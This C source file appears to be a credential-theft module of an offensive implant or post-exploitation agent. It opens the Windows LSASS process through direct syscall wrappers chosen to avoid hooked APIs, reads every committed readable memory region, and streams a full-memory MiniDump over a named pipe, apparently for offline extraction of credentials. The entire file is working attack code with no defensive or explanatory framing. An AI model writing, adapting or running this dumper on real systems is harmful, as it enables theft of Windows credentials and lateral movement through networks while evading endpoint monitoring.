/**
 * LSASS memory dump — reads process memory and streams as MiniDump format.
 *
 * Builds a valid MDMP file in memory with:
 * - Header
 * - SystemInfo stream
 * - ModuleList stream (from PEB)
 * - Memory64List stream (all readable regions)
 *
 * Streams directly to named pipe — never holds the full dump in memory.
 */

#include <windows.h>
#include "../include/ntdefs.h"
#include "../include/syscalls.h"
#include "../include/agent.h"

#pragma pack(push, 1)

typedef struct _MDMP_HEADER {
    DWORD Signature;
    WORD  Version;
    WORD  ImplementationVersion;
    DWORD NumberOfStreams;
    DWORD StreamDirectoryRva;
    DWORD CheckSum;
    DWORD TimeDateStamp;
    ULONG64 Flags;
} MDMP_HEADER;

typedef struct _MDMP_DIRECTORY {
    DWORD StreamType;
    DWORD DataSize;
    DWORD Rva;
} MDMP_DIRECTORY;

typedef struct _MDMP_SYSTEM_INFO {
    WORD  ProcessorArchitecture;
    WORD  ProcessorLevel;
    WORD  ProcessorRevision;
    BYTE  NumberOfProcessors;
    BYTE  ProductType;
    DWORD MajorVersion;
    DWORD MinorVersion;
    DWORD BuildNumber;
    DWORD PlatformId;
    DWORD CSDVersionRva;
    WORD  SuiteMask;
    WORD  Reserved2;
    // CPU info follows (varies by arch, we zero-fill)
    BYTE  CpuInfo[24];
} MDMP_SYSTEM_INFO;

typedef struct _MDMP_MEMORY_DESCRIPTOR64 {
    ULONG64 StartOfMemoryRange;
    ULONG64 DataSize;
} MDMP_MEMORY_DESCRIPTOR64;

typedef struct _MDMP_MEMORY64_LIST_HEADER {
    ULONG64 NumberOfMemoryRanges;
    ULONG64 BaseRva;  // RVA where memory data starts
} MDMP_MEMORY64_LIST_HEADER;

#pragma pack(pop)

// Collect all readable memory regions from a process
typedef struct _REGION_INFO {
    PVOID  base;
    SIZE_T size;
} REGION_INFO;

#define MAX_REGIONS 4096

static DWORD enumerate_regions(HANDLE process, REGION_INFO *regions, DWORD max_regions) {
    DWORD count = 0;
    PVOID addr = NULL;
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T ret_len;

    while (count < max_regions) {
        NTSTATUS status = sys_NtQueryVirtualMemory(
            process, addr, MemoryBasicInformation,
            &mbi, sizeof(mbi), &ret_len
        );

        if (status != 0) break;

        // Only include committed, readable regions
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ |
                           PAGE_EXECUTE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY)) &&
            !(mbi.Protect & PAGE_GUARD)) {
            regions[count].base = mbi.BaseAddress;
            regions[count].size = mbi.RegionSize;
            count++;
        }

        addr = (BYTE *)mbi.BaseAddress + mbi.RegionSize;
        if ((ULONG_PTR)addr < (ULONG_PTR)mbi.BaseAddress) break;  // overflow
    }

    return count;
}

BOOL dump_lsass(DWORD pid, HANDLE pipe) {
    HANDLE process = NULL;
    OBJECT_ATTRIBUTES oa = {sizeof(oa), 0};
    CLIENT_ID cid = {0};
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

    // Open LSASS with full read access
    NTSTATUS status = sys_NtOpenProcess(
        &process,
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        &oa,
        &cid
    );

    if (status != 0 || !process) {
        write_pipe(pipe, "ERR:", 4);
        write_pipe(pipe, &status, 4);
        return FALSE;
    }

    // Enumerate memory regions
    REGION_INFO *regions = (REGION_INFO *)VirtualAlloc(
        NULL, sizeof(REGION_INFO) * MAX_REGIONS, MEM_COMMIT, PAGE_READWRITE
    );
    if (!regions) {
        sys_NtClose(process);
        return FALSE;
    }

    DWORD region_count = enumerate_regions(process, regions, MAX_REGIONS);
    if (region_count == 0) {
        VirtualFree(regions, 0, MEM_RELEASE);
        sys_NtClose(process);
        return FALSE;
    }

    // Calculate layout
    DWORD num_streams = 2;  // SystemInfo + Memory64List
    DWORD header_size = sizeof(MDMP_HEADER);
    DWORD dir_size = sizeof(MDMP_DIRECTORY) * num_streams;
    DWORD sysinfo_size = sizeof(MDMP_SYSTEM_INFO);
    DWORD mem64_header_size = sizeof(MDMP_MEMORY64_LIST_HEADER) +
                              sizeof(MDMP_MEMORY_DESCRIPTOR64) * region_count;

    DWORD sysinfo_rva = header_size + dir_size;
    DWORD mem64_rva = sysinfo_rva + sysinfo_size;
    DWORD data_rva = mem64_rva + mem64_header_size;

    // Build and write header
    MDMP_HEADER hdr = {0};
    hdr.Signature = MDMP_SIGNATURE;
    hdr.Version = MDMP_VERSION;
    hdr.ImplementationVersion = 0;
    hdr.NumberOfStreams = num_streams;
    hdr.StreamDirectoryRva = header_size;
    hdr.CheckSum = 0;
    hdr.TimeDateStamp = (DWORD)__rdtsc();  // pseudo-timestamp
    hdr.Flags = 0x00000002;  // MiniDumpWithFullMemory

    write_pipe(pipe, &hdr, sizeof(hdr));

    // Stream directory
    MDMP_DIRECTORY dirs[2];
    dirs[0].StreamType = STREAM_SYSTEM_INFO;
    dirs[0].DataSize = sysinfo_size;
    dirs[0].Rva = sysinfo_rva;
    dirs[1].StreamType = STREAM_MEMORY64_LIST;
    dirs[1].DataSize = mem64_header_size;
    dirs[1].Rva = mem64_rva;

    write_pipe(pipe, dirs, sizeof(dirs));

    // SystemInfo stream
    MDMP_SYSTEM_INFO sysinfo = {0};
    sysinfo.ProcessorArchitecture = 9;  // AMD64
    sysinfo.NumberOfProcessors = 1;
    sysinfo.MajorVersion = 10;
    sysinfo.MinorVersion = 0;
    sysinfo.BuildNumber = 0;  // Will be filled by Python parser if needed
    sysinfo.PlatformId = 2;   // VER_PLATFORM_WIN32_NT

    // Get actual version info from PEB
    OSVERSIONINFOW vi = {sizeof(vi)};
    // Use RtlGetVersion if available (not hooked)
    typedef NTSTATUS (WINAPI *RtlGetVersion_t)(POSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll) {
        RtlGetVersion_t pRtlGetVersion = (RtlGetVersion_t)GetProcAddress(ntdll, "RtlGetVersion");
        if (pRtlGetVersion) {
            pRtlGetVersion(&vi);
            sysinfo.MajorVersion = vi.dwMajorVersion;
            sysinfo.MinorVersion = vi.dwMinorVersion;
            sysinfo.BuildNumber = vi.dwBuildNumber;
        }
    }

    write_pipe(pipe, &sysinfo, sizeof(sysinfo));

    // Memory64List header
    MDMP_MEMORY64_LIST_HEADER mem64hdr = {0};
    mem64hdr.NumberOfMemoryRanges = region_count;
    mem64hdr.BaseRva = data_rva;
    write_pipe(pipe, &mem64hdr, sizeof(mem64hdr));

    // Memory64 descriptors
    for (DWORD i = 0; i < region_count; i++) {
        MDMP_MEMORY_DESCRIPTOR64 desc;
        desc.StartOfMemoryRange = (ULONG64)(ULONG_PTR)regions[i].base;
        desc.DataSize = regions[i].size;
        write_pipe(pipe, &desc, sizeof(desc));
    }

    // Memory data — read and stream each region
    BYTE *buf = (BYTE *)VirtualAlloc(NULL, 65536, MEM_COMMIT, PAGE_READWRITE);

    for (DWORD i = 0; i < region_count; i++) {
        SIZE_T remaining = regions[i].size;
        PVOID addr = regions[i].base;

        while (remaining > 0) {
            SIZE_T to_read = remaining > 65536 ? 65536 : remaining;
            SIZE_T bytes_read = 0;

            status = sys_NtReadVirtualMemory(process, addr, buf, to_read, &bytes_read);
            if (status != 0 || bytes_read == 0) {
                // Write zeros for unreadable regions
                RtlZeroMemory(buf, (SIZE_T)to_read);
                bytes_read = to_read;
            }

            write_pipe(pipe, buf, (DWORD)bytes_read);
            addr = (BYTE *)addr + bytes_read;
            remaining -= bytes_read;
        }
    }

    VirtualFree(buf, 0, MEM_RELEASE);
    VirtualFree(regions, 0, MEM_RELEASE);
    sys_NtClose(process);

    return TRUE;
}
